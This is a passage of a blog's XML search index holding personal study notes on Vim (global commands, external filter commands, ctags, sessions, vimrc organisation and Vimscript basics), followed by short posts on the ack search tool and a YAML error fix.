Overview</h3><p>Both Ex commmands and command-line commands are the same. They are the commands that start with a colon <code>:</code>.</p><p>They are called Ex because they originally came from the Ex text editor.</p><p>Check out <code>:h ex-cmd-index</code></p><p>Syntax:</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-symbol">:g/pattern/command</span><br></code></pre></td></tr></table></figure><p>The global command works by executing <code>command</code> against each line that matches the pattern.</p><p>When running the <code>g</code> command, Vim makes two scans across file.</p><h3 id="Inverse-Match"><a href="#Inverse-Match" class="headerlink" title="Inverse Match"></a>Inverse Match</h3><p>To run the global command on non-matching lines.</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-symbol">:g!/pattern/command</span><br></code></pre></td></tr></table></figure><p>or</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-symbol">:v/pattern/command</span><br></code></pre></td></tr></table></figure><h3 id="Pattern"><a href="#Pattern" class="headerlink" title="Pattern"></a>Pattern</h3><p>Same pattern system as the substitude command.</p><h3 id="Passing-a-Range"><a href="#Passing-a-Range" class="headerlink" title="Passing a Range"></a>Passing a Range</h3><p>If no range are given, by default it affects the entire file.</p><p>Symbles as range:</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">.   means <span class="hljs-keyword">the</span> current <span class="hljs-built_in">line</span>. .,<span class="hljs-number">3</span><br>$   means <span class="hljs-keyword">the</span> <span class="hljs-keyword">last</span> <span class="hljs-built_in">line</span> <span class="hljs-keyword">in</span> <span class="hljs-keyword">the</span> <span class="hljs-built_in">file</span><br>+n means n <span class="hljs-keyword">lines</span> <span class="hljs-keyword">after</span> <span class="hljs-keyword">the</span> current <span class="hljs-built_in">line</span>. <span class="hljs-number">3</span>,.+<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><h3 id="Executing-a-Macro"><a href="#Executing-a-Macro" class="headerlink" title="Executing a Macro"></a>Executing a Macro</h3><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-symbol">:g/const/normal</span> <span class="hljs-variable">@a</span><br></code></pre></td></tr></table></figure><h3 id="Recursive-Global-Command"><a href="#Recursive-Global-Command" class="headerlink" title="Recursive Global Command"></a>Recursive Global Command</h3><p>The global command itself is a type of a command-line command.</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-symbol">:g/console/g/two/d</span><br></code></pre></td></tr></table></figure><h3 id="Changing-the-Delimiter-1"><a href="#Changing-the-Delimiter-1" class="headerlink" title="Changing the Delimiter"></a>Changing the Delimiter</h3><p>Still, you can use any single byte character except for alphabets, numbers, <code>&quot;</code>, <code>|</code> and <code>\</code></p><p>like <code>:g@console@d</code></p><h3 id="The-Default-Command"><a href="#The-Default-Command" class="headerlink" title="The Default Command"></a>The Default Command</h3><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-symbol">:g/console</span><br></code></pre></td></tr></table></figure><p>as </p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-symbol">:g/console/p</span><br></code></pre></td></tr></table></figure><p>The syntax:</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-symbol">:g/re/p</span><br></code></pre></td></tr></table></figure><p><code>grep</code> got its name there.</p><h3 id="Black-Hole-Delete"><a href="#Black-Hole-Delete" class="headerlink" title="Black Hole Delete"></a>Black Hole Delete</h3><p>Make Vim not store your deleted lines into the registers.</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-symbol">:g/console/d_</span><br></code></pre></td></tr></table></figure><h3 id="Reduce-Multiple-Empty-Lines-to-One-Empty-Line"><a href="#Reduce-Multiple-Empty-Lines-to-One-Empty-Line" class="headerlink" title="Reduce Multiple Empty Lines to One Empty Line"></a>Reduce Multiple Empty Lines to One Empty Line</h3><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-symbol">:g/^</span><span class="hljs-variable">$/</span>,<span class="hljs-regexp">/./</span>-1j<br></code></pre></td></tr></table></figure><p><code>j</code> is the <code>join</code> command.<br>Another form of global command:</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-symbol">:g/pattern1/</span>,<span class="hljs-regexp">/pattern2/command</span><br></code></pre></td></tr></table></figure><h3 id="Advanced-Sort"><a href="#Advanced-Sort" class="headerlink" title="Advanced Sort"></a>Advanced Sort</h3><p>You can give a range:</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">:<span class="hljs-number">2</span>,<span class="hljs-number">3</span><span class="hljs-built_in">sort</span><br></code></pre></td></tr></table></figure><h2 id="External-Commands"><a href="#External-Commands" class="headerlink" title="External Commands"></a>External Commands</h2><h3 id="The-Bang-Command"><a href="#The-Bang-Command" class="headerlink" title="The Bang Command"></a>The Bang Command</h3><p><code>!</code> can do three things. <code>:r</code> is the <code>:read</code> command.</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-number">1.</span> Reading <span class="hljs-keyword">the</span> STDOUT <span class="hljs-keyword">of</span> <span class="hljs-keyword">a</span> Command Into Vim. <br>   :r !cmd<br><span class="hljs-number">2.</span> Writing <span class="hljs-keyword">the</span> Buffer Content Into <span class="hljs-keyword">an</span> External Command. <br>   :w !cmd<br><span class="hljs-number">3.</span> Executing <span class="hljs-keyword">an</span> External Command.<br>   :!cmd<br></code></pre></td></tr></table></figure><p>The bang <code>!</code> always stay before the cmd.</p><h3 id="Filtering-Texts"><a href="#Filtering-Texts" class="headerlink" title="Filtering Texts"></a>Filtering Texts</h3><p>If you give <code>!</code> a range, it can be used to filter texts.</p><figure class="highlight clojure"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs clojure"><span class="hljs-symbol">:.!</span><br></code></pre></td></tr></table></figure><p>executes the filter command on the current line.</p><p><code>:%!</code> executes the filter command on all lines.</p><h3 id="Normal-Mode-Command"><a href="#Normal-Mode-Command" class="headerlink" title="Normal Mode Command"></a>Normal Mode Command</h3><p>Vim has a filter operater <code>!</code> in the normal mode.</p><h2 id="Command-line-Mode"><a href="#Command-line-Mode" class="headerlink" title="Command-line Mode"></a>Command-line Mode</h2><p>To leave the command-line mode, you can use <code>&lt;esc&gt;</code>, <code>Ctrl-C</code> or <code>Ctrl-[</code>.</p><h3 id="Repeating-the-Previous-Command"><a href="#Repeating-the-Previous-Command" class="headerlink" title="Repeating the Previous Command"></a>Repeating the Previous Command</h3><p>Running <code>@:&lt;mark&gt;&lt;mark&gt;</code>.</p><h3 id="Command-line-Mode-Shortcuts"><a href="#Command-line-Mode-Shortcuts" class="headerlink" title="Command-line Mode Shortcuts"></a>Command-line Mode Shortcuts</h3><p>To go to the start of the line, use <code>Ctrl-B</code></p><p>To go to the end of the line, use <code>Ctrl-E</code></p><p>To edit the command like you would a normal textfile use <code>Ctrl-F</code>.</p><h3 id="Register-and-Autocomplete"><a href="#Register-and-Autocomplete" class="headerlink" title="Register and Autocomplete"></a>Register and Autocomplete</h3><p>Everything that you can get from the register in the insert mode, you can do the same from the command-line mode.</p><p>Using <code>Ctrl-R</code> to insert the content of register.</p><h3 id="History-Window-and-Command-line-Window"><a href="#History-Window-and-Command-line-Window" class="headerlink" title="History Window and Command-line Window"></a>History Window and Command-line Window</h3><p>To open the command-line history, run <code>:his :</code>.</p><p>Reusing the command, run <code>q:</code> and choose.</p><p>To open the search history, run <code>:his /</code> or <code>his ?</code>.</p><p>Edit past history, run <code>q/</code> or <code>q?</code>.</p><p>check out <code>:h ex-cmd</code> or <code>:h index</code>.</p><h2 id="Tags"><a href="#Tags" class="headerlink" title="Tags"></a>Tags</h2><h3 id="Tag-Generator"><a href="#Tag-Generator" class="headerlink" title="Tag Generator"></a>Tag Generator</h3><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">ctags</span> = C <span class="hljs-literal">on</span>ly<br><span class="hljs-attr">ptags</span> = Perl<br></code></pre></td></tr></table></figure><p>There are many Tag Generator, almost for different language.</p><p>Install the universal ctags, which is still maintained.</p><h3 id="Tags-Anatomy"><a href="#Tags-Anatomy" class="headerlink" title="Tags Anatomy"></a>Tags Anatomy</h3><p>Four components: </p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-bullet">1.</span> tagname<br><span class="hljs-bullet">2.</span> tagfile<br><span class="hljs-bullet">3.</span> tagaddress<br><span class="hljs-bullet">4.</span> tag options<br></code></pre></td></tr></table></figure><p>The content of the tag file depends on which generator you use.</p><p>A tag file must have either one of those format:</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">1. </span><span class="hljs-template-variable">&#123;tagname&#125;</span><span class="language-xml"> </span><span class="hljs-template-variable">&#123;TAB&#125;</span><span class="language-xml"> </span><span class="hljs-template-variable">&#123;tagfile&#125;</span><span class="language-xml"> </span><span class="hljs-template-variable">&#123;TAB&#125;</span><span class="language-xml"> </span><span class="hljs-template-variable">&#123;tagaddress&#125;</span><span class="language-xml"></span><br><span class="language-xml">2. </span><span class="hljs-template-variable">&#123;tagname&#125;</span><span class="language-xml"> </span><span class="hljs-template-variable">&#123;TAB&#125;</span><span class="language-xml"> </span><span class="hljs-template-variable">&#123;tagfile&#125;</span><span class="language-xml"> </span><span class="hljs-template-variable">&#123;TAB&#125;</span><span class="language-xml"> </span><span class="hljs-template-variable">&#123;tagaddress&#125;</span><span class="language-xml"> </span><span class="hljs-template-variable">&#123;term&#125;</span><span class="language-xml"> </span><span class="hljs-template-variable">&#123;fild&#125;</span><span class="language-xml"> ..</span><br></code></pre></td></tr></table></figure><h3 id="The-Tag-File"><a href="#The-Tag-File" class="headerlink" title="The Tag File"></a>The Tag File</h3><p>Run <code>set tags?</code>.</p><p>To add a new tag file location:</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">set</span> <span class="hljs-keyword">tags</span>+=path/<span class="hljs-keyword">to</span>/my/<span class="hljs-keyword">tags</span>/<span class="hljs-keyword">file</span><br></code></pre></td></tr></table></figure><h3 id="Generating-Tags-for-a-Large-Project"><a href="#Generating-Tags-for-a-Large-Project" class="headerlink" title="Generating Tags for a Large Project"></a>Generating Tags for a Large Project</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">ctags -R <span class="hljs-attribute">--exclude</span>=.git <span class="hljs-attribute">--exclude</span>=vendor <span class="hljs-attribute">--exclude</span>=node_modules<br></code></pre></td></tr></table></figure><h3 id="Tags-Navigation"><a href="#Tags-Navigation" class="headerlink" title="Tags Navigation"></a>Tags Navigation</h3><p>The tag jump key <code>Ctrl-]</code> or run <code>:tag name</code> </p><h3 id="Tag-Priority"><a href="#Tag-Priority" class="headerlink" title="Tag Priority"></a>Tag Priority</h3><p>Some tags have higher priorities.</p><p>check out <code>:h tag-priority</code>.</p><h3 id="Selective-Tag-Jumps"><a href="#Selective-Tag-Jumps" class="headerlink" title="Selective Tag Jumps"></a>Selective Tag Jumps</h3><p>run <code>:tselect name</code></p><p>Normal mode key for <code>tjump</code> : <code>g Ctrl-]</code>.</p><h3 id="Automatic-Tag-Generation"><a href="#Automatic-Tag-Generation" class="headerlink" title="Automatic Tag Generation"></a>Automatic Tag Generation</h3><p>Using <code>autocmd</code>:</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">:<span class="hljs-keyword">autocmd</span> BufWritePost \*.rb <span class="hljs-keyword">silent</span> !ctags -R .<br></code></pre></td></tr></table></figure><p>One plugin vim-gutemtags. </p><h2 id="Fold"><a href="#Fold" class="headerlink" title="Fold"></a>Fold</h2><p>Executing a fold from the command-line mode:</p><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs coq">:,+<span class="hljs-number">1</span><span class="hljs-built_in">fold</span><br></code></pre></td></tr></table></figure><h3 id="Syntax-Fold"><a href="#Syntax-Fold" class="headerlink" title="Syntax Fold"></a>Syntax Fold</h3><p>It is determined by syntax language highlighting.</p><p>Check out <code>:h syntax.txt</code></p><h2 id="Git"><a href="#Git" class="headerlink" title="Git"></a>Git</h2><p>Running <code>:vimdiff</code> command to show the differences between multiple files. or <code>vim -d file1.txt file2.txt</code></p><p>Go to the next diff with <code>]c</code>.</p><p>Jump to the previous diff window, use [c</p><p>One plugin â€˜tpope&#x2F;vim-fugitiveâ€™</p><h2 id="Compile"><a href="#Compile" class="headerlink" title="Compile"></a>Compile</h2><p>Vim has a <code>:make</code> command to run a makefile.</p><h2 id="Views-Sessions-and-Viminfo"><a href="#Views-Sessions-and-Viminfo" class="headerlink" title="Views, Sessions, and Viminfo"></a>Views, Sessions, and Viminfo</h2><p>To store the current change of settings, folds, buffers, layouts, etc.</p><h3 id="Configuring-View-Attributes"><a href="#Configuring-View-Attributes" class="headerlink" title="Configuring View Attributes"></a>Configuring View Attributes</h3><p>Tell View to remember the <code>localoptions</code>, run <code>:set viewoptions+=localoptions</code></p><h3 id="Saving-the-View"><a href="#Saving-the-View" class="headerlink" title="Saving the View"></a>Saving the View</h3><p>Run <code>:mkview</code></p><h3 id="Loading-the-View-File"><a href="#Loading-the-View-File" class="headerlink" title="Loading the View File"></a>Loading the View File</h3><p>Run <code>:loadview</code></p><h3 id="Sessions"><a href="#Sessions" class="headerlink" title="Sessions"></a>Sessions</h3><p>View saves the settings of a window, a Session saves the infomation of all windows (including the layout). </p><h4 id="Save-a-Session"><a href="#Save-a-Session" class="headerlink" title="Save a Session"></a>Save a Session</h4><p>Run <code>:mksession</code>.</p><p>A Session file is saved in the current directory or you can choose.</p><h4 id="Loading-a-Session"><a href="#Loading-a-Session" class="headerlink" title="Loading a Session"></a>Loading a Session</h4><p>To load a Session, run</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">:<span class="hljs-keyword">source</span> Session.<span class="hljs-keyword">vim</span><br></code></pre></td></tr></table></figure><h3 id="Viminfo"><a href="#Viminfo" class="headerlink" title="Viminfo"></a>Viminfo</h3><p>Session stores the â€œexternalâ€ attributes and Viminfo the â€œinternalâ€ attributes.</p><p>One Viminfo file per computer.</p><p>Default location: <code>~/.viminfo</code></p><h2 id="Multiple-File-Operations"><a href="#Multiple-File-Operations" class="headerlink" title="Multiple File Operations"></a>Multiple File Operations</h2><p>Vim has eight ways to execute commands across multiple files:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java">  <br>arg <span class="hljs-title function_">list</span> <span class="hljs-params">(argdo)</span><br>buffer <span class="hljs-title function_">list</span> <span class="hljs-params">(bufdo)</span><br>window <span class="hljs-title function_">list</span> <span class="hljs-params">(windo)</span><br>tab <span class="hljs-title function_">list</span> <span class="hljs-params">(tabdo)</span><br>quickfix <span class="hljs-title function_">list</span> <span class="hljs-params">(cdo)</span><br>quickfix list <span class="hljs-title function_">filewise</span> <span class="hljs-params">(cfdo)</span><br>location <span class="hljs-title function_">list</span> <span class="hljs-params">(ldo)</span><br>location list <span class="hljs-title function_">filewise</span> <span class="hljs-params">(lfdo)</span><br></code></pre></td></tr></table></figure><p>Same idea: make a list of their respective categories then pass them the command that you want to run.</p><h2 id="Vimrc"><a href="#Vimrc" class="headerlink" title="Vimrc"></a>Vimrc</h2><h3 id="Organizing-Vimrc"><a href="#Organizing-Vimrc" class="headerlink" title="Organizing Vimrc"></a>Organizing Vimrc</h3><p>Two ways to keep your vimrc to look clean:</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">Splite your vimrc <span class="hljs-keyword">into</span> several <span class="hljs-built_in">files</span><br>Fold your vimrc <span class="hljs-built_in">file</span><br></code></pre></td></tr></table></figure><p>Using <code>:source</code> to splite.</p><h2 id="Vim-packages"><a href="#Vim-packages" class="headerlink" title="Vim packages"></a>Vim packages</h2><p>Vimâ€™s own built-in plugin manager called packages.</p><p><mark>the <code>version</code> command</mark><br>you can get some function of your vim.</p><h2 id="Vim-Runtime"><a href="#Vim-Runtime" class="headerlink" title="Vim Runtime"></a>Vim Runtime</h2><p>To see your run time path, run <code>:set runtimepath?</code></p><h3 id="Filetype-Detection"><a href="#Filetype-Detection" class="headerlink" title="Filetype Detection"></a>Filetype Detection</h3><p>Two ways to detecte:</p><p>  file name<br>  file content</p><p><code>:setfiletype type</code> will work only there is no type is set.</p><h4 id="Filetype-File"><a href="#Filetype-File" class="headerlink" title="Filetype File"></a>Filetype File</h4><p>Create a <code>filetype.vim</code> in the root directory <code>~/.vim/filetype.vim</code>.</p><p>To prevent running multiple times:</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable"><span class="hljs-keyword">if</span></span> <span class="hljs-function"><span class="hljs-title">exists</span>(<span class="hljs-string">&quot;did_load_filetypes&quot;</span>)</span><br>  <span class="hljs-variable">finish</span><br><span class="hljs-variable"><span class="hljs-keyword">endif</span></span><br></code></pre></td></tr></table></figure><p><code>finish</code> is a Vim command to stop running the rest of the script.</p><h4 id="File-Type-Script"><a href="#File-Type-Script" class="headerlink" title="File Type Script"></a>File Type Script</h4><p>Based on the file content.</p><p>Adding a <code>scripts.vim</code> file (<code>~/.vim/scripts.vim</code>)</p><p>I suppose you can use other name instead of <code>scripts.vim</code></p><h2 id="Vimscript-Basic-Data-Types"><a href="#Vimscript-Basic-Data-Types" class="headerlink" title="Vimscript Basic Data Types"></a>Vimscript Basic Data Types</h2><h3 id="Following-Along-With-Ex-Mode"><a href="#Following-Along-With-Ex-Mode" class="headerlink" title="Following Along With Ex Mode"></a>Following Along With Ex Mode</h3><p>The Ex mode is like an extended command-line mode (itâ€™s like typing command-line mode commands non-stop), run <code>Q</code> or <code>gQ</code> to enter.</p><p><mark>somethings Iâ€™m curious about</mark><br>Before some command, there is a <code>g</code> like <code>gQ</code>.</p><p><code>g</code> was just an empty slot, it means nothing.</p><p>To clear your message history, run:</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">:messages clear<br></code></pre></td></tr></table></figure><h3 id="Double-vs-Single-Quotes"><a href="#Double-vs-Single-Quotes" class="headerlink" title="Double vs Single Quotes"></a>Double vs Single Quotes</h3><p>Single quotes display characters literally.</p><p>Double quotes accept special characters.</p><p>List use <code>[]</code></p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs clean">Dictionary use `&#123;&#125;`<br>### Special Primitives<br>Vim has <span class="hljs-keyword">special</span> primetives:<br></code></pre></td></tr></table></figure><p>  v:false<br>  v:true<br>  v:none<br>  v:null</p><pre><code class="hljs">`v:` is Vim&#39;s built-in variable.</code></pre>]]></content>
    
    
    <categories>
      
      <category>Vim</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>About-ack</title>
    <link href="/2022/07/03/About-ack/"/>
    <url>/2022/07/03/About-ack/</url>
    
    <content type="html"><![CDATA[<p>[toc]</p><hr><p><a href="https://beyondgrep.com/">reference</a></p><hr><h2 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h2><p>ack is a grep-like source code search tool.</p><p>It uses the perl style regex grammer.</p><hr><h2 id="ack-vim"><a href="#ack-vim" class="headerlink" title="ack.vim"></a>ack.vim</h2><p>You can search on <a href="https://vimawesome.com/">https://vimawesome.com/</a>.</p><hr><h2 id="Some-Syntax"><a href="#Some-Syntax" class="headerlink" title="Some Syntax"></a>Some Syntax</h2><p><code>!</code> before <code>:Ack</code>, the Vim will not jump to the first occurrence.</p>]]></content>
    
    
    <categories>
      
      <category>Tool</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>end of the stream or a document separator is expected</title>
    <link href="/2022/07/02/end-of-the-stream-or-a-document-separator-is-expected/"/>
    <url>/2022/07/02/end-of-the-stream-or-a-document-separator-is-expected/</url>
    
    <content type="html"><![CDATA[<p>After analysing the error output, I delete the <code>&#123;&#125;</code> in the file, and itâ€™s fixxed.</p>]]></content>
    
    
    <categories>
      
      <category>Errors</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Use Leaderf in Vim</title>
    <link href="/2022/07/01/Use-Leaderf-in-Vim/"/>
    <url>/2022/07/01/Use-Leaderf-in-Vim/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    <categories>
      
      <category>Vim</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Use Perl to Write Vimscript</title>
    <link href="/2022/07/01/Use-Perl-to-Write-Vimscript/"/>
    <url>/2022/07/01/Use-Perl-to-Write-Vimscript/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    <categories>
      
      <category>Vim</category>
      
    </categories>
    
    
  </entry>
  
  
  
  
</search>
